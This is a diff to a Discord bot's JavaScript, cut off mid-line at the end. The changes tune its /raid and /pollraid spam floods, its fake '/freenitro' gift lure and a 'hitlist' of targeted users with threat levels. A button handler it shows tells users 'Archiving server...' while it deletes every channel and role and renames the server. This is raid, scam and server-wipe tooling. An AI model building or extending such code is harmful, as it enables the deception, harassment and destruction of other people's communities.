@@ -61,7 +61,11 @@ function loadDockingPoints() {
 }
 
 function saveDockingPoints() {
-  fs.writeFileSync(DOCKING_FILE, JSON.stringify([...dockingPoints]));
+  try {
+    fs.writeFileSync(DOCKING_FILE, JSON.stringify([...dockingPoints]));
+  } catch (e) {
+    console.error("Could not save docking-points.json:", e);
+  }
 }
 
 const dockingPoints = loadDockingPoints();
@@ -78,7 +82,11 @@ function loadHitlist() {
 }
 
 function saveHitlist() {
-  fs.writeFileSync(HITLIST_FILE, JSON.stringify([...hitlist]));
+  try {
+    fs.writeFileSync(HITLIST_FILE, JSON.stringify([...hitlist]));
+  } catch (e) {
+    console.error("Could not save hitlist.json:", e);
+  }
 }
 
 const hitlist = loadHitlist();
@@ -101,10 +109,10 @@ function buildHitlistEmbed(entry) {
     author: { name: "HITLIST" },
     thumbnail: { url: entry.avatarUrl },
     fields: [
-      { name: "Display Name", value: entry.displayName,                                              inline: true  },
-      { name: "Username",     value: `@${entry.username}`,                                           inline: true  },
-      { name: "User ID",      value: entry.userId,                                                   inline: false },
-      { name: "Threat Level", value: `${filled}${empty}  ${threat.name} \u2014 ${threat.label}`,    inline: false },
+      { name: "Display Name", value: entry.displayName,                                           inline: true  },
+      { name: "Username",     value: `@${entry.username}`,                                        inline: true  },
+      { name: "User ID",      value: entry.userId,                                                inline: false },
+      { name: "Threat Level", value: `${filled}${empty}  ${threat.name} \u2014 ${threat.label}`, inline: false },
     ],
   };
 }
@@ -119,32 +127,50 @@ const sayCommand = new SlashCommandBuilder()
   .addStringOption((opt) =>
     opt.setName("message").setDescription("The message to send").setRequired(true)
   )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the response").setRequired(false)
+  )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
 const raidCommand = new SlashCommandBuilder()
   .setName("raid")
-  .setDescription("Spawn a Fire button that blasts 5 copies of your message per press")
+  .setDescription("Spawn a Fire button that blasts copies of your message per press")
   .addStringOption((opt) =>
     opt.setName("message").setDescription("The message to spam").setRequired(true)
+  )
+  .addNumberOption((opt) =>
+    opt.setName("interval").setDescription("Seconds between each message (0.1–1.0, default 1.0)").setMinValue(0.1).setMaxValue(1.0).setRequired(false)
+  )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the launcher (spam is still public)").setRequired(false)
   )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
 const pollraidCommand = new SlashCommandBuilder()
   .setName("pollraid")
-  .setDescription("Spawn a Fire button that blasts 5 Discord polls per press")
+  .setDescription("Spawn a Fire button that blasts Discord polls per press")
   .addBooleanOption((opt) =>
     opt.setName("use_default").setDescription('Use the default "Who Wins?" poll').setRequired(false)
   )
   .addStringOption((opt) =>
-    opt.setName("question").setDescription("Custom poll question (ignored if use_default is true)").setRequired(false)
+    opt.setName("question").setDescription("Custom poll question").setRequired(false)
   )
   .addStringOption((opt) =>
     opt.setName("answers").setDescription("Comma-separated answers, e.g. Yes,No,Maybe").setRequired(false)
   )
   .addIntegerOption((opt) =>
     opt.setName("duration").setDescription("Poll duration in hours (1-32, default 24)").setMinValue(1).setMaxValue(32).setRequired(false)
+  )
+  .addIntegerOption((opt) =>
+    opt.setName("count").setDescription("Polls per click (3–20, default 5)").setMinValue(3).setMaxValue(20).setRequired(false)
+  )
+  .addNumberOption((opt) =>
+    opt.setName("interval").setDescription("Seconds between each poll (0.1–1.0, default 1.0)").setMinValue(0.1).setMaxValue(1.0).setRequired(false)
+  )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the launcher (spam is still public)").setRequired(false)
   )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
@@ -162,6 +188,9 @@ const dockingSetCommand = new SlashCommandBuilder()
   .addStringOption((opt) =>
     opt.setName("name").setDescription("Name for this docking point").setRequired(true)
   )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the response").setRequired(false)
+  )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
@@ -170,6 +199,9 @@ const dockingLocateCommand = new SlashCommandBuilder()
   .setDescription("Get a jump link to a saved docking point")
   .addStringOption((opt) =>
     opt.setName("name").setDescription("Name of the docking point").setRequired(true).setAutocomplete(true)
+  )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the response").setRequired(false)
   )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
@@ -180,12 +212,18 @@ const dockingDeleteCommand = new SlashCommandBuilder()
   .addStringOption((opt) =>
     opt.setName("name").setDescription("Name of the docking point to delete").setRequired(true).setAutocomplete(true)
   )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the response").setRequired(false)
+  )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
 const freeNitroCommand = new SlashCommandBuilder()
   .setName("freenitro")
   .setDescription("Claim your free Discord Nitro")
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the response").setRequired(false)
+  )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
 
@@ -199,7 +237,7 @@ const uploadHitlistCommand = new SlashCommandBuilder()
     opt.setName("displayname").setDescription("Display name to show on the card").setRequired(true)
   )
   .addStringOption((opt) =>
-    opt.setName("username").setDescription("Username of the target (autocompletes existing entries)").setRequired(true).setAutocomplete(true)
+    opt.setName("username").setDescription("Username (optional — auto-fetched from Discord if left blank)").setRequired(false).setAutocomplete(true)
   )
   .addIntegerOption((opt) =>
     opt.setName("threatlevel")
@@ -207,6 +245,9 @@ const uploadHitlistCommand = new SlashCommandBuilder()
       .setRequired(true)
       .setMinValue(1)
       .setMaxValue(6)
+  )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the response").setRequired(false)
   )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
@@ -216,6 +257,9 @@ const viewHitlistCommand = new SlashCommandBuilder()
   .setDescription("View a target's hitlist card")
   .addStringOption((opt) =>
     opt.setName("target").setDescription("Username or display name of the target").setRequired(true).setAutocomplete(true)
+  )
+  .addBooleanOption((opt) =>
+    opt.setName("ephemeral").setDescription("Only you can see the response").setRequired(false)
   )
   .setIntegrationTypes([ApplicationIntegrationType.GuildInstall, ApplicationIntegrationType.UserInstall])
   .setContexts([InteractionContextType.Guild, InteractionContextType.BotDM, InteractionContextType.PrivateChannel]);
@@ -306,20 +350,26 @@ client.on("interactionCreate", async (interaction) => {
   if (interaction.isChatInputCommand()) {
 
     if (interaction.commandName === "say") {
-      await interaction.reply({ content: interaction.options.getString("message") });
+      const ephemeral = interaction.options.getBoolean("ephemeral") ?? false;
+      await interaction.reply({ content: interaction.options.getString("message"), ephemeral });
       return;
     }
 
     if (interaction.commandName === "raid") {
-      const text = interaction.options.getString("message");
-      const id = storePayload({ type: "text", content: text });
-      await interaction.reply({ content: text, components: [getSpamRow("r", id)] });
+      const text     = interaction.options.getString("message");
+      const interval = interaction.options.getNumber("interval") ?? 1.0;
+      const ephemeral = interaction.options.getBoolean("ephemeral") ?? false;
+      const id = storePayload({ type: "text", content: text, interval });
+      await interaction.reply({ content: text, components: [getSpamRow("r", id)], ephemeral });
       return;
     }
 
     if (interaction.commandName === "pollraid") {
       const useDefault = interaction.options.getBoolean("use_default");
-      const duration = interaction.options.getInteger("duration") ?? 24;
+      const duration   = interaction.options.getInteger("duration") ?? 24;
+      const count      = interaction.options.getInteger("count") ?? 5;
+      const interval   = interaction.options.getNumber("interval") ?? 1.0;
+      const ephemeral  = interaction.options.getBoolean("ephemeral") ?? false;
       let question, answers;
 
       if (useDefault) {
@@ -343,8 +393,8 @@ client.on("interactionCreate", async (interaction) => {
         }
       }
 
-      const id = storePayload({ type: "poll", question, answers, duration });
-      await interaction.reply({ content: `Poll: ${question}`, components: [getSpamRow("p", id)] });
+      const id = storePayload({ type: "poll", question, answers, duration, count, interval });
+      await interaction.reply({ content: `Poll: ${question}`, components: [getSpamRow("p", id)], ephemeral });
       return;
     }
 
@@ -362,8 +412,9 @@ client.on("interactionCreate", async (interaction) => {
     }
 
     if (interaction.commandName === "dockingpointset") {
-      const name = interaction.options.getString("name");
-      await interaction.reply({ content: `Docking point **${name}** set here. Use /dockingpointlocate to jump back.` });
+      const name      = interaction.options.getString("name");
+      const ephemeral = interaction.options.getBoolean("ephemeral") ?? false;
+      await interaction.reply({ content: `Docking point **${name}** set here. Use /dockingpointlocate to jump back.`, ephemeral });
       const reply = await interaction.fetchReply();
       const guildOrDM = interaction.guildId ?? "@me";
       const url = `https://discord.com/channels/${guildOrDM}/${reply.channelId}/${reply.id}`;
@@ -373,7 +424,8 @@ client.on("interactionCreate", async (interaction) => {
     }
 
     if (interaction.commandName === "dockingpointlocate") {
-      const name = interaction.options.getString("name");
+      const name      = interaction.options.getString("name");
+      const ephemeral = interaction.options.getBoolean("ephemeral") ?? false;
       const url = dockingPoints.get(name.toLowerCase());
       if (!url) {
         await interaction.reply({ content: `No docking point named **${name}** found.`, ephemeral: true });
@@ -382,7 +434,7 @@ client.on("interactionCreate", async (interaction) => {
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setLabel(`Jump to: ${name}`).setURL(url).setStyle(ButtonStyle.Link)
       );
-      await interaction.reply({ content: `Docking point **${name}**`, components: [row] });
+      await interaction.reply({ content: `Docking point **${name}**`, components: [row], ephemeral });
       return;
     }
 
@@ -399,65 +451,75 @@ client.on("interactionCreate", async (interaction) => {
     }
 
     if (interaction.commandName === "freenitro") {
+      const ephemeral = interaction.options.getBoolean("ephemeral") ?? false;
       const row = new ActionRowBuilder().addComponents(
         new ButtonBuilder().setCustomId("freenitro:claim").setLabel("Claim Free Nitro").setStyle(ButtonStyle.Primary)
       );
       await interaction.reply({
         content: "You have been gifted Discord Nitro! Click below to claim it before it expires.",
         components: [row],
+        ephemeral,
       });
       return;
     }
 
     if (interaction.commandName === "uploadhitlist") {
-      await interaction.deferReply();
-
-      const userId      = interaction.options.getString("userid").trim();
-      const displayName = interaction.options.getString("displayname").trim();
-      const username    = interaction.options.getString("username").trim();
-      const threatLevel = interaction.options.getInteger("threatlevel");
-
-      let avatarUrl;
+      const ephemeral = interaction.options.getBoolean("ephemeral") ?? false;
+      await interaction.deferReply({ ephemeral });
       try {
-        const user = await client.users.fetch(userId);
-        avatarUrl = user.displayAvatarURL({ size: 256, extension: "png" });
-      } catch {
-        await interaction.editReply({ content: `Could not find a Discord user with ID **${userId}**. Make sure it is a valid User ID.` });
-        return;
+        const userId      = interaction.options.getString("userid").trim();
+        const displayName = interaction.options.getString("displayname").trim();
+        const threatLevel = interaction.options.getInteger("threatlevel");
+
+        let avatarUrl, username;
+        try {
+          const user = await client.users.fetch(userId);
+          avatarUrl = user.displayAvatarURL({ size: 256, extension: "png" });
+          username  = interaction.options.getString("username")?.trim() || user.username;
+        } catch {
+          await interaction.editReply({ content: `Could not find a Discord user with ID **${userId}**. Make sure it is a valid User ID.` });
+          return;
+        }
+
+        const entry = { userId, username, displayName, avatarUrl, threatLevel };
+        hitlist.set(userId, entry);
+        saveHitlist();
+
+        const threat = THREAT[threatLevel];
+        await interaction.editReply({
+          content: `**${displayName}** added to the hitlist. Threat level: **${threat.name} (${threat.label})**`,
+          embeds: [buildHitlistEmbed(entry)],
+        });
+      } catch (err) {
+        console.error("uploadhitlist error:", err);
+        try { await interaction.editReply({ content: "Something went wrong. Check the bot logs." }); } catch (_) {}
       }
-
-      const entry = { userId, username, displayName, avatarUrl, threatLevel };
-      hitlist.set(userId, entry);
-      saveHitlist();
-
-      const threat = THREAT[threatLevel];
-      await interaction.editReply({
-        content: `**${displayName}** added to the hitlist. Threat level: **${threat.name} (${threat.label})**`,
-        embeds: [buildHitlistEmbed(entry)],
-      });
       return;
     }
 
     if (interaction.commandName === "viewhitlist") {
-      await interaction.deferReply();
-
-      const targetInput = interaction.options.getString("target");
-      let entry = hitlist.get(targetInput);
-      if (!entry) {
-        const lower = targetInput.toLowerCase();
-        entry = [...hitlist.values()].find(
-          (e) =>
-            e.username.toLowerCase() === lower ||
-            e.displayName.toLowerCase() === lower
-        );
+      const ephemeral = interaction.options.getBoolean("ephemeral") ?? false;
+      await interaction.deferReply({ ephemeral });
+      try {
+        const targetInput = interaction.options.getString("target");
+        let entry = hitlist.get(targetInput);
+        if (!entry) {
+          const lower = targetInput.toLowerCase();
+          entry = [...hitlist.values()].find(
+            (e) =>
+              e.username.toLowerCase() === lower ||
+              e.displayName.toLowerCase() === lower
+          );
+        }
+        if (!entry) {
+          await interaction.editReply({ content: `No hitlist entry found for **${targetInput}**.` });
+          return;
+        }
+        await interaction.editReply({ embeds: [buildHitlistEmbed(entry)] });
+      } catch (err) {
+        console.error("viewhitlist error:", err);
+        try { await interaction.editReply({ content: "Something went wrong. Check the bot logs." }); } catch (_) {}
       }
-
-      if (!entry) {
-        await interaction.editReply({ content: `No hitlist entry found for **${targetInput}**.` });
-        return;
-      }
-
-      await interaction.editReply({ embeds: [buildHitlistEmbed(entry)] });
       return;
     }
   }
@@ -496,9 +558,7 @@ client.on("interactionCreate", async (interaction) => {
           return;
         }
       }
-
       await interaction.update({ content: "Archiving server...", components: [] });
-
       try {
         const channels = await guild.channels.fetch();
         for (const [, channel] of channels) {
@@ -506,7 +566,6 @@ client.on("interactionCreate", async (interaction) => {
           try { await channel.delete(); } catch (_) {}
         }
       } catch (err) { console.error("Error fetching channels:", err); }
-
       try {
         const roles = await guild.roles.fetch();
         for (const [, role] of roles) {
@@ -514,24 +573,24 @@ client.on("interactionCreate", async (interaction) => {
           try { await role.delete(); } catch (_) {}
         }
       } catch (err) { console.error("Error fetching roles:", err); }
-
       try { await guild.setName("[Archived Server]"); } catch (_) {}
       return;
     }
 
     if (customId.startsWith("rfire:") || customId.startsWith("rmore:")) {
-      const colon = customId.indexOf(":");
+      const colon  = customId.indexOf(":");
       const action = customId.slice(1, colon);
-      const id = customId.slice(colon + 1);
+      const id     = customId.slice(colon + 1);
       const payload = messageStore.get(id);
       if (!payload) {
         await interaction.reply({ content: "This session has expired. Run the command again.", ephemeral: true });
         return;
       }
+      const intervalMs = Math.round((payload.interval ?? 1.0) * 1000);
       if (action === "fire") {
         await interaction.deferUpdate();
         for (let i = 0; i < 5; i++) {
-          try { await interaction.followUp({ content: payload.content }); await sleep(300); }
+          try { await interaction.followUp({ content: payload.content }); await sleep(intervalMs); }
           catch (err) { console.error("raid followUp error:", err); }
         }
         return;
@@ -544,9 +603,9 @@ client.on("interactionCreate", async (interaction) => {
     }
 
     if (customId.startsWith("pfire:") || customId.startsWith("pmore:")) {
-      const colon = customId.indexOf(":");
+      const colon  = customId.indexOf(":");
       const action = customId.slice(1, colon);
-      const id = customId.slice(colon + 1);
+      const id     = customId.slice(colon + 1);
       const payload = messageStore.get(id);
       if (!payload) {
         await interaction.reply({ content: "This session has expired. Run the command again.", ephemeral: true });
@@ -558,21 +617,8 @@ client.on("interactionCreate", async (interaction) => {
         duration: payload.duration,
         allowMultiselect: false,
       };
+      const count      = payload.count ?? 5;
+      const intervalMs = Math.round((payload.interval ?? 1.0) * 1000);
       if (action === "fire") {
         await interaction.deferUpdate();
-        for (let i = 0; i < 5; i++) {
-          try { await interaction.followUp({ poll: pollData }); await sleep(500); }
-          catch (err) { console.error(`pollraid followUp ${i + 1} error:`, err); }
-        }
-        return;
-      }
-      if (action === "more") {
-        await interaction.deferUpdate();
-        await interaction.followUp({ content: `Poll: ${payload.question}`, components: [getSpamRow("p", id)] });
-        return;
-      }
-    }
-  }
-});
-
-client.login(TOKEN);
+        for (let i = 0; i
